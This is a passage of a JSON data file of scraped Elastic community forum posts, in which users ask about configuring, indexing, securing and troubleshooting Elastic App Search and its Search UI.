    "author": "malik_aditya",
    "date": "February 6, 2020, 10:42am February 6, 2020, 11:18am March 5, 2020, 11:26am",
    "body": "Hi I'm trying to get data directly via API call. Is there any way to format result field. Like currently:- \"fieldName\": { \"raw\": \"value\" } to:- \"fieldName\":\"value\"",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "e8534905-393d-42a5-8176-1cb0dfd512fd",
    "url": "https://discuss.elastic.co/t/exporting-and-importing-relevance-settings/218151",
    "title": "Exporting and Importing relevance settings?",
    "category": [
      "App Search"
    ],
    "author": "Iconeer",
    "date": "February 6, 2020, 10:53am February 7, 2020, 9:00am March 5, 2020, 11:15am",
    "body": "Hi! How can I export relevance settings and import them into another engine? (Something similar to the /synonyms endpoint).",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "05ce6870-2ddb-431d-82e3-28b38f7e511b",
    "url": "https://discuss.elastic.co/t/tokenizers-stop-words-and-query-analysis-in-app-search/218066",
    "title": "Tokenizers, stop words and query analysis in App Search",
    "category": [
      "App Search"
    ],
    "author": "pc_user",
    "date": "February 5, 2020, 11:59pm February 6, 2020, 12:11am March 5, 2020, 12:15am",
    "body": "Does App Search allow using custom tokenizers and stop words? How do I introduce new stop words to the indexer? Also, is there a way to see how the score is calculated, like a query analyzer? I'm new to App Search and ElasticSearch. As far as I understand, one of the motivations to use App Search should be to avoid using custom stuff but still there might be some cases where it comes handy. A query analyzer would help a lot as well. Thanks.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "0aab92a7-1dab-4064-907b-883efbe2cc64",
    "url": "https://discuss.elastic.co/t/retrieving-documents-elastic-app-search-node/216920",
    "title": "Retrieving Documents @elastic/app-search-node",
    "category": [
      "App Search"
    ],
    "author": "Jonathan_Gautier",
    "date": "January 28, 2020, 9:32pm January 30, 2020, 12:09pm February 1, 2020, 9:48am February 3, 2020, 5:01pm February 3, 2020, 5:04pm February 3, 2020, 10:15pm February 4, 2020, 12:43pm March 3, 2020, 12:43pm",
    "body": "Hi i got problem with this npm, When i want to retrieve documents. My Code I got this : Package doesnt send any Body and request was empty and result 400 bad request Seem Request package doesn't add JSON or Params",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "eb079e33-562d-4699-a878-58f0ed07171d",
    "url": "https://discuss.elastic.co/t/result-view-color-and-size-of-result-card/216300",
    "title": "Result view color and size of result card",
    "category": [
      "App Search"
    ],
    "author": "SRani",
    "date": "January 23, 2020, 4:56pm January 23, 2020, 5:25pm January 23, 2020, 5:54pm January 23, 2020, 6:14pm January 23, 2020, 6:14pm January 24, 2020, 12:28am January 24, 2020, 11:31am January 25, 2020, 12:54am January 27, 2020, 11:52am January 30, 2020, 3:47pm February 3, 2020, 4:18pm February 28, 2020, 6:32pm",
    "body": "Can we change the result views' background color and the result grid's size....Please let e know.I am trying to see if the CSS can be modified",
    "website_area": "discuss",
    "replies": 12
  },
  {
    "id": "7bb6509b-52c7-482c-b6bf-1c7c5cc6c43f",
    "url": "https://discuss.elastic.co/t/one-search-box-results-from-different-engines-in-two-different-tabs/217093",
    "title": "One Search Box:results from different engines in two different tabs",
    "category": [
      "App Search"
    ],
    "author": "georgina",
    "date": "January 30, 2020, 1:48am January 30, 2020, 11:55am February 27, 2020, 11:55am",
    "body": "Continuing the discussion from How to implement proximity search in app search: I am trying to get this to work but am struggling to convert the pseudo code into working code. Are you able to explain this some more, for a react newbie? Pseudocode from How to implement proximity search in app search state = { engine: 'engine1' } const connector = new AppSearchAPIConnector({ searchKey: \"\", engineName: this.state.engineName, hostIdentifier: \"\" }); return <SearchProvider config={{ apiConnector: connector }} > <div> <SearchBox /> <Tab1 id=\"tab1\" onClick={() => setState({ engine: 'engine1' })}/> <Tab2 id=\"tab1\" onClick={() => setState({ engine: 'engine2' })}/> </div> </SearchProvider>",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "ab2343ea-2dfa-4a07-bc46-57791b033cb9",
    "url": "https://discuss.elastic.co/t/can-i-import-data-from-my-index-into-app-search/216809",
    "title": "Can I import data from my index into App search?",
    "category": [
      "App Search"
    ],
    "author": "111249",
    "date": "January 28, 2020, 10:26am January 28, 2020, 12:42pm January 28, 2020, 11:42am January 28, 2020, 11:54am February 25, 2020, 12:02pm",
    "body": "Hello all! I have index in elasticsearch cluster. When I start using app search it suggest me to paste some data in several ways. But I want add data from my index. How I can do it?",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "0415df9d-b7fc-4cab-a077-c4a0e8622f38",
    "url": "https://discuss.elastic.co/t/indices-eating-too-much-space-50-gb-each/216609",
    "title": "Indices eating too much space (~50 GB each)",
    "category": [
      "App Search"
    ],
    "author": "The-Big-K",
    "date": "January 27, 2020, 7:00am January 28, 2020, 10:02am January 28, 2020, 10:19am February 25, 2020, 10:20am",
    "body": "I'm using Elasticsearch 7.5.2 on uBuntu. Recently, I began using elasticsearch to display relevant search results on every page load. This shot up the volume; but I also found out that it has created large index files. Note that I'm using 'app-search' to power my queries. Here's the sample index files that are occupying too much space: .app-search-analytics-logs-loco_togo_production-7.1.0-2020.01.26 => 52 GB .app-search-analytics-logs-loco_togo_production-7.1.0-2020.01.27 => 53 GB I tried deleting these using CURL, but they reappear and show lesser space (~5 GB each). Following is the command I used - curl -XDELETE -u myUserName:MyPassWord \"http://localhost:9200/.app-search-app-logs-loco_togo_production-7.1.0-2020.01.25\" throws following error - \"root_cause\":[{\"type\":\"index_not_found_exception\",\"reason\":\"no such index I want to know if there is a way to control these indexes. I'm not sure what purpose do these indices solve and if there is a way to prevent them? Thank you in advance.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "935a4dbe-d710-4993-a390-00e15d44a5cf",
    "url": "https://discuss.elastic.co/t/64-fields-limitation/216702",
    "title": "64 fields limitation",
    "category": [
      "App Search"
    ],
    "author": "antonvanhooydonk",
    "date": "January 27, 2020, 4:54pm January 27, 2020, 5:22pm January 27, 2020, 6:26pm February 24, 2020, 6:26pm",
    "body": "We would like to host App Search on premise. Currently there is a limitation of 64 fields per document. Is there a way around this limitation for a self-manage installation? Does the cloud hosted version have this limitation as well? Thank you for your help!",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "3f054157-4f54-45e6-a1c0-1689f4098314",
    "url": "https://discuss.elastic.co/t/synonyms-limit-plans/216201",
    "title": "Synonyms Limit plans",
    "category": [
      "App Search"
    ],
    "author": "uklft",
    "date": "January 23, 2020, 9:05am January 23, 2020, 12:15pm January 23, 2020, 12:55pm January 23, 2020, 2:21pm January 27, 2020, 1:28pm February 24, 2020, 1:28pm",
    "body": "Hey there, first off thank your for providing this great piece of software, it is a breeze to work with and takes so much work off our shoulders! I have already read that the Synonyms are limited to 255 items and there is no way to get around that. Still i would like to ask whether there are any plans of taking off that limit. We are currently self-hosted, but are willing to go Pro as this is an important feature for us. Kind regards, Fabian",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "739aeaad-c7dd-49f1-a550-dd9b7e3879b2",
    "url": "https://discuss.elastic.co/t/facets-date-range/216586",
    "title": "Facets Date Range",
    "category": [
      "App Search"
    ],
    "author": "Jonathan_Gautier",
    "date": "January 26, 2020, 11:13pm January 27, 2020, 1:03am January 28, 2020, 9:24pm February 24, 2020, 11:35am",
    "body": "Hi how to make facet date range in search ui OR filters date range in filters ? Thanks",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "fa71163b-892d-4662-8065-0bdc50f4e625",
    "url": "https://discuss.elastic.co/t/app-search-document-api/216314",
    "title": "App-search document API?",
    "category": [
      "App Search"
    ],
    "author": "fred_wang",
    "date": "January 23, 2020, 8:34pm January 24, 2020, 11:51am January 24, 2020, 5:51pm February 21, 2020, 5:51pm",
    "body": "Is there a way to query the documents in an app search engine by more than just id? I'm scanning document here: Swiftype Documents | Swiftype Documentation Learn how to get the most out of Swiftype and search here: Swiftype Search API | Swiftype Documentation Learn how to get the most out of Swiftype Looks like the only hooks we get is asking for all documents, or a specific document by id, or searching using a text string or number. What I'm looking for is for a data set like users below, the ability to request a list of documents that match a particular value (e.g. status=\"Active\", or organization contains \"Navy\") Is that possible from either the Restful APIs or the Javascript client? [ { \"id\": 4, \"name\": \"Doe, Ann A. \", \"rank\": \"CTR\", \"email\": \"Ann.a.doe@mail.mil\", \"organization\": \"Navy • CNIC • CNDW\", \"role\": \"Authorized User\", \"status\": \"Active\", \"edipi\": \"1456741258\", \"date_created\": \"2019-03-09\", \"last_login\": \"2019-12-20\", \"groups\": \"CNDW\", \"date_requested\": null }, { \"id\": 5, \"name\": \"Doe, Jane T. \", \"rank\": \"CTR\", \"email\": \"jane.t.doe@mail.mil\", \"organization\": \"Navy • CNIC • EURAFCENT\", \"role\": \"Authorized User\", \"status\": \"Active\", \"edipi\": \"1593574265\", \"date_created\": \"2019-04-06\", \"last_login\": \"2020-01-03\", \"groups\": \"CNIC \", \"date_requested\": null }, ... ]",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "ee75b82d-51ba-451c-bdfd-d1a4c67bc976",
    "url": "https://discuss.elastic.co/t/accessing-the-result-field-from-the-searchui-to-pass-to-another-api/216285",
    "title": "Accessing the result field from the searchUI to pass to another api",
    "category": [
      "App Search"
    ],
    "author": "mchennupati",
    "date": "January 23, 2020, 3:52pm January 23, 2020, 4:47pm January 23, 2020, 5:33pm January 23, 2020, 6:16pm January 23, 2020, 9:53pm January 24, 2020, 11:39am January 24, 2020, 12:40pm January 24, 2020, 1:22pm February 21, 2020, 1:22pm",
    "body": "Hi, I am trying to configure a search with autocomplete. I guess a common use case is where on retrieving the autocomplete suggestions and identifying the search term. For e.g, in the videogames tutorial. You can search for starcraft. You enter starcr, the autocomplete suggests starcraft. I then choose starcraft. I would now like to pass this to another api, say where I can get the price. I guess I am trying to access the state variable {results} or {result} or I could alternatively also use {searchTerm}. I have looked at the documentation https://github.com/elastic/search-ui but am struggling to get it to work. Anyhelp would be great ! Thanks a lot. CodeSandbox – 13 Jun 19 Video-Games-Tutorial - CodeSandbox Video-Games-Tutorial by JasonStoltz using @elastic/react-search-ui, @elastic/search-ui-app-search-connector, react, react-dom, react-scripts",
    "website_area": "discuss",
    "replies": 9
  },
  {
    "id": "a4ebe6af-5446-452f-a390-5b3ea65e7fa4",
    "url": "https://discuss.elastic.co/t/how-to-add-filter-in-query-suggestion-feature/216112",
    "title": "How to add filter in \"query suggestion\" feature",
    "category": [
      "App Search"
    ],
    "author": "viphuangwei",
    "date": "January 22, 2020, 5:39pm January 23, 2020, 11:47am January 23, 2020, 8:50pm February 20, 2020, 8:50pm",
    "body": "Hi There, Is that possible to add additional filters in the \"query suggestion\". e.g. There is an index: { jobID: string, jobTitle: string, user: string, ......... } We select \"jobTitle\" this field as a suggestion field. One issue is that if we type words in the search box, then the auto-complete will return all the candidate words for all user. We would like to an additional filter to narrow down the candidate words belong to specific uers. like user = 'david'",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "d5bb16a6-c6d4-45e6-847f-030ea14a183a",
    "url": "https://discuss.elastic.co/t/self-hosted-app-search-limited-to-one-es-node/215211",
    "title": "Self-hosted App Search limited to one ES Node?",
    "category": [
      "App Search"
    ],
    "author": "fred_wang",
    "date": "January 15, 2020, 8:59pm January 16, 2020, 4:18am January 20, 2020, 10:21am January 17, 2020, 4:03pm January 20, 2020, 10:33am January 23, 2020, 8:25pm January 23, 2020, 8:46pm February 20, 2020, 8:47pm",
    "body": "I tried to configure a multi-node elastic search (3 nodes) and an app search engine using Docker compose. I finally got what I think is a working docker-compose.yml for this (The documentation on using Docker compose with App search only includes a single node instance) However, in running it, I get the following error message: appsearch-engine | [2020-01-15T20:36:12.852+00:00][14][2002][app-server][ERROR]: appsearch-engine | -------------------------------------------------------------------------------- appsearch-engine | appsearch-engine | Elasticsearch cluster must be licensed. OSS versions of Elasticsearch do not contain a supported license. Please download and run an Elasticsearch binary from https://elastic.co/downloads/elasticsearch to acquire a free, Basic license. appsearch-engine | appsearch-engine | -------------------------------------------------------------------------------- Does this mean we can not run multi-node elastic search clusters backing app search if we self-host? If this is is not the right interpretation, how do we apply a basic license to the docker-compose.yml during the startup?",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "bb10288e-5f58-4535-8751-a33319b5e9b8",
    "url": "https://discuss.elastic.co/t/signed-search-key-via-api/215457",
    "title": "Signed Search Key via API",
    "category": [
      "App Search"
    ],
    "author": "malik_aditya",
    "date": "January 21, 2020, 4:20pm January 17, 2020, 12:52pm January 20, 2020, 5:08am January 23, 2020, 5:25am January 23, 2020, 5:25am February 20, 2020, 5:25am",
    "body": "Hi, I was trying to use SignedSearchKey approach via API but the search and result settings are applied to the whole engine instead for that specifc key. Is there any workaround for that? Like creating keys with predefined search and result settings. So you can just use different keys to search on different specific fields and get differnt result sets.",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "22098beb-4681-4f28-9de0-2d411aef0fb5",
    "url": "https://discuss.elastic.co/t/self-hosted-elastic-app-search-add-user-via-invitation-not-working/214601",
    "title": "Self hosted Elastic App Search add user via invitation not working",
    "category": [
      "App Search"
    ],
    "author": "abhishek.haith",
    "date": "January 13, 2020, 6:07pm January 10, 2020, 4:50pm January 13, 2020, 12:27pm January 13, 2020, 2:11pm January 16, 2020, 11:05am January 22, 2020, 7:18am January 22, 2020, 7:18am February 19, 2020, 7:18am",
    "body": "I have set up Elastic App Search in standard security mode. Configuration picked from below document - Swiftype App Search, Self Managed, Security and User Management | Swiftype Documentation Learn how to get the most out of Swiftype Also configured mailer so I am able to get invitation mail. After submitting the create account form getting Authentication has failed error. Elastic App Search user registration failed402×676 32.1 KB Logs on console - appsearch_1 | [2020-01-10T12:49:24.958+00:00][13][2284][app-server][INFO]: [81d2d6bf-cd7e-4d29-956b-55c9783dd068] Started POST \"/authenticate/accept_invitation\" for 172.23.0.1 at 2020-01-10 12:49:24 +0000 appsearch_1 | [2020-01-10T12:49:24.990+00:00][13][2284][action_controller][INFO]: [81d2d6bf-cd7e-4d29-956b-55c9783dd068] Processing by AuthenticateController#accept_invitation as */* appsearch_1 | [2020-01-10T12:49:24.995+00:00][13][2284][action_controller][INFO]: [81d2d6bf-cd7e-4d29-956b-55c9783dd068] Parameters: {\"auth_strategy\"=>\"elasticsearch_standard\", \"user\"=>{\"password\"=>\"[FILTERED]\"}, \"lm_invitation_code\"=>\"hCYBOH9KuGvbgVQmOgUaQA\", \"host\"=>\"localhost:3002\", \"protocol\"=>\"http\"} appsearch_1 | [2020-01-10T12:49:25.063+00:00][13][2284][action_view][INFO]: [81d2d6bf-cd7e-4d29-956b-55c9783dd068] Rendered text template (0.2ms) appsearch_1 | [2020-01-10T12:49:25.066+00:00][13][2284][action_controller][INFO]: [81d2d6bf-cd7e-4d29-956b-55c9783dd068] Completed 403 Forbidden in 69ms (Views: 10.3ms) Please guide to make this working. Thank you.",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "430c65e1-82d0-4079-b155-c9aa7787d85e",
    "url": "https://discuss.elastic.co/t/how-to-implement-near-me/215304",
    "title": "How to implement Near Me",
    "category": [
      "App Search"
    ],
    "author": "JasonStoltz",
    "date": "January 16, 2020, 11:32am February 13, 2020, 11:32am",
    "body": "A user asked this question and then withdrew their post. Re-posting the answer here because I thought it was a valid question that others may have in the future: Near me can be implemented with a Geo Filter: https://swiftype.com/documentation/app-search/api/search/filters#geo-filters. \"filters\": { \"location\": { \"center\": \"37.386483, -122.083842\", \"distance\": 300, \"unit\": \"km\" } } Pass the user's location in as \"center\" and then adjust the \"distance\" and \"unit\" to whatever you would consider \"near\".",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "af188b6d-eb50-4954-9d09-638cfb809e89",
    "url": "https://discuss.elastic.co/t/appsearch-auto-sync-with-database/214887",
    "title": "AppSearch Auto Sync with database",
    "category": [
      "App Search"
    ],
    "author": "Jonathan_Gautier",
    "date": "January 13, 2020, 6:14pm January 14, 2020, 10:28am February 11, 2020, 10:28am",
    "body": "Hi ! I want to know if some software or script like Monstache (MongoDB -> Elasticsearch), exist for AppSearch to auto sync one database with MongoDB or another database to AppSearch. Thanks",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "fba3bd21-a8e3-4d6a-8228-e2cd5b2fcf5e",
    "url": "https://discuss.elastic.co/t/signed-search-keys-rate-limit/214885",
    "title": "Signed Search Keys Rate Limit",
    "category": [
      "App Search"
    ],
    "author": "Jonathan_Gautier",
    "date": "January 13, 2020, 6:09pm January 13, 2020, 6:17pm January 13, 2020, 7:03pm February 10, 2020, 7:03pm",
    "body": "Hi ! I want to know if we can make ratelimiting with Signed Search Keys ? Or another ways to limit on key usage ? Thanks",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "2ba837f0-76af-4662-b91b-060e49215993",
    "url": "https://discuss.elastic.co/t/app-search-parent-child-relationships/214618",
    "title": "App search parent child relationships",
    "category": [
      "App Search"
    ],
    "author": "arjunyel",
    "date": "January 10, 2020, 3:11pm January 13, 2020, 10:39am January 13, 2020, 10:46am February 10, 2020, 10:46am",
    "body": "Hello, we are evaluating app search vs regular elasticsearch, does app search support parent/child relationships? I can't find any mention of it in the docs. Thank you!",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "244213af-cb8b-4535-bcdf-c01573bd3671",
    "url": "https://discuss.elastic.co/t/self-hosted-appsearch-and-eck-can-not-login-to-appsearch-invalid-credentials/214683",
    "title": "Self hosted AppSearch and ECK - can not login to AppSearch - invalid credentials",
    "category": [
      "App Search"
    ],
    "author": "byteandbit",
    "date": "January 10, 2020, 10:56pm February 7, 2020, 10:56pm",
    "body": "Does anyone successfully configured the latest AppSearch Docker image (http://docker.elastic.co/app-search/app-search:7.5.1) with https://www.elastic.co/products/elastic-cloud-kubernetes (also 7.5.1) ? I have set up Elastic App Search in standard security mode. I have used default username and password. I also have reset the password in AppSearch via: bin/app-search --reset-auth and also in ElasticSearch via: POST /_security/user/app_search/_password Unfortunately nothing is working and can not login to AppSearch (keep getting Completed 403 Forbidden in AppSearch logs). Is there anything specific set in ECK that is not mentioned in AppSearch documentation (https://swiftype.com/documentation/app-search/self-managed/security) ?",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "7c089659-a581-46b9-a90c-b37c44f68f61",
    "url": "https://discuss.elastic.co/t/no-results-while-updating-re-indexing-schema/214472",
    "title": "No results while Updating/Re-indexing schema",
    "category": [
      "App Search"
    ],
    "author": "Harry_Knowles",
    "date": "January 9, 2020, 4:55pm January 10, 2020, 2:05pm February 7, 2020, 2:06pm",
    "body": "Hi, I've just noticed that when we run the \"update schema\" function, results no longer show at all when using the search until the index is complete. I can see why this happens, I'm just wondering if there is a way to avoid it, or serve some older/cached results while the schema is updating? The issue I'm having is every now and again, I am getting the \"Unable to save document\" error. When this happens, I've been instructed by your support team to simply run a schema update/re-index which fixed the issue. This would be fine if it wasn't for the schema update taking around an hour to complete, whilst results are unavailable. Is there a work around for this? Or another way other than re-indexing to fix the \"Unable to save document\" error? Thanks!",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "38bc29cb-aae8-4704-9fb1-0b6f0daf629e",
    "url": "https://discuss.elastic.co/t/missing-user-roles-on-self-hosted-app-search/214370",
    "title": "Missing User Roles on Self Hosted App Search",
    "category": [
      "App Search"
    ],
    "author": "abhishek.haith",
    "date": "January 9, 2020, 8:34am January 10, 2020, 5:03am January 10, 2020, 5:03am February 7, 2020, 5:10am",
    "body": "Currently I am trying to configure App Search with Role Based Access Control. I followed the documentation given in the link below - Swiftype App Search, Self Managed, Security and User Management | Swiftype Documentation Learn how to get the most out of Swiftype I have tried Standard and Elasticsearch Native Realm security mode but found only Owner and Admin roles in the App Search User section. As documented on the below link, other roles like Dev, Editor etc are not showing. Swiftype Role Based Access Control Guide | Swiftype Documentation Learn how to get the most out of Swiftype How to create/enable those roles? Thank you.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "a154251f-23df-4f93-8b85-e11b8858b746",
    "url": "https://discuss.elastic.co/t/docker-app-search-how-to-find-default-password/213235",
    "title": "Docker - app_search - how to find default password",
    "category": [
      "App Search"
    ],
    "author": "",
    "date": "December 27, 2019, 11:01pm December 30, 2019, 8:35am December 30, 2019, 8:37am December 30, 2019, 10:26am December 30, 2019, 10:29am January 1, 2020, 6:44am January 6, 2020, 12:18pm January 6, 2020, 11:01pm January 8, 2020, 10:42pm February 5, 2020, 10:42pm",
    "body": "",
    "website_area": "discuss",
    "replies": 10
  },
  {
    "id": "98dca1fa-90e0-46f2-88d0-326ac76eb221",
    "url": "https://discuss.elastic.co/t/document-deletion-is-painfully-slow-with-self-hosted-app-search/212914",
    "title": "Document deletion is painfully slow with self-hosted app-search",
    "category": [
      "App Search"
    ],
    "author": "The-Big-K",
    "date": "December 24, 2019, 5:09am December 30, 2019, 9:50am January 8, 2020, 6:53am February 5, 2020, 6:57am",
    "body": "I'm currently testing app-search locally and have setup ES + App Search latest version (7.5.1). I'm also making use of the official PHP client: https://github.com/elastic/app-search-php to test. I added about 2500 records (documents) in an engine and later decided to delete all of them. Since deleting the engine won't delete the documents, I decided loop over each document and delete them using IDs. Turns out that deleting each document is painfully slow - taking about ~2 seconds for each. I also tried feeding array of 100 Ids to delete; but it still takes about the same time. Is this the expected behavior? Is there any way to speed this up? PS: Also want to know if the self-hosted app-search is limited to indexing 100,000 documents?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "4b22bc52-9350-4403-a810-ca107be26c2d",
    "url": "https://discuss.elastic.co/t/how-to-import-10-millions-of-documents-about-5g-into-app-search/211716",
    "title": "How to import 10 millions of documents (about 5G) into app search?",
    "category": [
      "App Search"
    ],
    "author": "viphuangwei",
    "date": "December 12, 2019, 7:58pm December 13, 2019, 11:55am December 13, 2019, 6:40pm December 13, 2019, 8:21pm December 14, 2019, 4:20pm December 29, 2019, 9:00pm January 2, 2020, 12:23pm January 3, 2020, 3:32am January 3, 2020, 1:52pm January 3, 2020, 2:05pm January 3, 2020, 6:02pm January 6, 2020, 1:11am January 6, 2020, 11:52am January 8, 2020, 3:51am February 5, 2020, 3:50am",
    "body": "Hi There, How to import 10 million of documents (about 5G) into the App search (self-managed)? What's the best practice to do it? Is there any limitation to do this. Thanks, Wei.",
    "website_area": "discuss",
    "replies": 15
  },
  {
    "id": "d5a628b1-fb50-4575-99cd-0cc8308396be",
    "url": "https://discuss.elastic.co/t/maximum-character-limit-in-a-query/213740",
    "title": "Maximum character limit in a Query",
    "category": [
      "App Search"
    ],
    "author": "joao_Dubas",
    "date": "January 3, 2020, 6:49pm January 6, 2020, 11:51am January 6, 2020, 12:12pm January 6, 2020, 12:38pm February 3, 2020, 12:38pm",
    "body": "Hi! I'm new to the elk, and i have installed the self-managed appsearch. And i need to make querys with more then 128 characters, how do i raise that limit?",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "3fd7a22f-e4fa-458d-a4fd-8ff6ae013d10",
    "url": "https://discuss.elastic.co/t/how-to-make-search-ui-show-results-in-a-new-tab/212577",
    "title": "How to make Search UI show results in a new tab?",
    "category": [
      "App Search"
    ],
    "author": "kasibiel",
    "date": "December 20, 2019, 12:25am December 20, 2019, 11:24am December 20, 2019, 9:37pm January 2, 2020, 12:18pm January 30, 2020, 12:18pm",
    "body": "Hello! I am new to React, so please excuse me if I am asking a lame question. I would like to set up the Reference UI to show search results (upon pressing the \"Search\" button) in a new tab or on a new page. How can I achieve that? After spending nearly a day on this I wasn't able to figure out by myself. Basically, I would like to configure my website so that it shows the search box on the home page, but the search results are displayed on a separate page. I would appreaciate your assistance. Thank you! Kasia",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "5cf410af-c004-4d86-a3bf-6bdbbc7f32ff",
    "url": "https://discuss.elastic.co/t/about-indexing-documents/213378",
    "title": "About Indexing Documents",
    "category": [
      "App Search"
    ],
    "author": "viphuangwei",
    "date": "December 30, 2019, 7:21pm December 30, 2019, 7:26pm December 30, 2019, 7:52pm January 27, 2020, 7:52pm",
    "body": "Hi There, Is that any way to support the uppercase name of the indexing document, It seems that it only supports the lowercase name of the document. e.g. we would like to support {'orderID': 100001}, it only support {'orderid': 100001} now. Because our existing name of JSON for both Frond and Back End are all camel style. There would be a lot of places need to change. Is that any good suggestion?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "b8e92e77-9a07-4cb7-b0cb-a5ce4c5eca55",
    "url": "https://discuss.elastic.co/t/docker-and-kubernetes-problem-with-connecting-to-elasticsearch/213129",
    "title": "Docker and Kubernetes problem with connecting to Elasticsearch",
    "category": [
      "App Search"
    ],
    "author": "",
    "date": "December 27, 2019, 5:09am December 27, 2019, 8:55pm January 24, 2020, 8:55pm",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "877e2416-9a5f-43cb-a496-d982d8cea2bb",
    "url": "https://discuss.elastic.co/t/not-seeing-clicks-being-reported/212766",
    "title": "Not seeing Clicks being reported",
    "category": [
      "App Search"
    ],
    "author": "CKennedy",
    "date": "December 22, 2019, 7:26am December 23, 2019, 8:22am December 23, 2019, 10:47am January 20, 2020, 10:47am",
    "body": "Hi We have recently implemented Appsearch and everything is working well. Only thing is that we are not seeing any click reporting in the UI and preety confident that there have been some volume. Is there an additional integration required to get this to roll up? Many thanks",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "491c2a42-66b6-4649-ae10-f03e6e269004",
    "url": "https://discuss.elastic.co/t/how-to-do-date-range-filter-for-documents-in-swiftype/212069",
    "title": "How to do Date range filter for documents in Swiftype?",
    "category": [
      "App Search"
    ],
    "author": "viphuangwei",
    "date": "December 16, 2019, 10:37pm December 20, 2019, 12:43pm December 18, 2019, 5:31pm December 20, 2019, 12:43pm",
    "body": "Hi There, Is that any sample to do the date range filter for documents in Swiftype, Do we support this now? e.g. I would like to filter out the \"invoice date\" between '2019-01-01' and '2019-12-31' Thanks, Wei.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "6eeec333-c651-4818-be01-1cfe483352ad",
    "url": "https://discuss.elastic.co/t/receiving-unable-to-save-document-when-submitting-documents-through-api/211468",
    "title": "Receiving \"Unable to save document\" when submitting documents through API",
    "category": [
      "App Search"
    ],
    "author": "Harry_Knowles",
    "date": "December 11, 2019, 1:19pm December 12, 2019, 11:55am December 12, 2019, 1:50pm December 13, 2019, 12:00pm January 10, 2020, 12:00pm",
    "body": "Hi, can't find this error anywhere in the docs. I'm wondering when this error is supposed to be thrown? I'm using a Shopify webhook to send product data to the search engine when product information updates and I seem to be getting this error a lot more than it being successful. Is it possible that this is thrown when a documents contents hasn't changed? Thanks, Harry.",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "e34ad10a-81c8-4d07-8d6b-1b84fc3c12c5",
    "url": "https://discuss.elastic.co/t/filter-search-by-score/208322",
    "title": "Filter search by score",
    "category": [
      "App Search"
    ],
    "author": "AlejandroNextChance",
    "date": "November 19, 2019, 1:17pm November 18, 2019, 10:11pm November 18, 2019, 10:12pm November 19, 2019, 9:25am November 19, 2019, 12:40pm November 19, 2019, 2:09pm November 22, 2019, 12:16pm November 22, 2019, 6:02pm November 25, 2019, 12:56pm November 25, 2019, 3:33pm November 25, 2019, 5:24pm November 26, 2019, 3:37pm November 30, 2019, 7:11am December 2, 2019, 10:32pm December 5, 2019, 4:34am December 12, 2019, 11:58am December 13, 2019, 6:49am January 10, 2020, 6:49am",
    "body": "I’d like to perform a search, but only get back search results that have a score greater-than 1 for instance. Is this possible?",
    "website_area": "discuss",
    "replies": 18
  },
  {
    "id": "23720b1b-6742-42dc-beab-333c8190a1f7",
    "url": "https://discuss.elastic.co/t/appsearch-swiftype-duplicatekeyerror-self-managed/208215",
    "title": "AppSearch Swiftype::Documents::DuplicateKeyError Self-Managed",
    "category": [
      "App Search"
    ],
    "author": "Harry_Knowles",
    "date": "November 17, 2019, 10:30am November 17, 2019, 4:19pm November 19, 2019, 1:48pm November 19, 2019, 1:48pm November 19, 2019, 10:42am December 4, 2019, 11:01am December 9, 2019, 1:40pm January 6, 2020, 1:40pm",
    "body": "Hi we're trying to install a self managed version of App Search on our server, however when trying to connect to the API to index documents it's returning me the following error: [\"Internal server error. Please email support@swiftype.com if this error persists.\"] In the server logs, it looks like there is some sort of duplicate key error, but I can't find anything about this online. It does let 1 or 2 API requests through before throwing this error. You can see the server logs here: http://134.209.185.32/appsearcherror.txt Anyone have any ideas on how we could fix this? Thanks, Harry.",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "5cd049ff-2adf-4ec5-a4cb-8cc2d2760208",
    "url": "https://discuss.elastic.co/t/response-total-results-doesnt-match-results/210274",
    "title": "Response total results doesn't match results",
    "category": [
      "App Search"
    ],
    "author": "abohannon",
    "date": "December 3, 2019, 3:44am December 3, 2019, 9:51am December 3, 2019, 6:17pm December 4, 2019, 9:17am January 1, 2020, 9:17am",
    "body": "I'm attempting to remove duplicate entries in our index by deleting all documents before re-uploading, but after I delete all documents 60 still remain and I'm unable to delete them. And when I query for the list of documents, I get total_results: 60 but an empty array for the actual results. Is this a bug or am I overlooking something? Screenshot of query response: Screenshot of trying to access a document in the web app (this document, despite being deleted, is still somehow being indexed on our site): Screen Shot 2019-12-02 at 7.43.09 PM.png2046×296 40.5 KB",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "ce3e04ce-d3aa-4476-8243-8239acac9060",
    "url": "https://discuss.elastic.co/t/elastic-app-search-self-managed-and-bonsai-io-integration/209580",
    "title": "Elastic app search(Self-managed) and bonsai.io integration",
    "category": [
      "App Search"
    ],
    "author": "111249",
    "date": "November 26, 2019, 8:45pm November 27, 2019, 10:27pm December 24, 2019, 9:43pm",
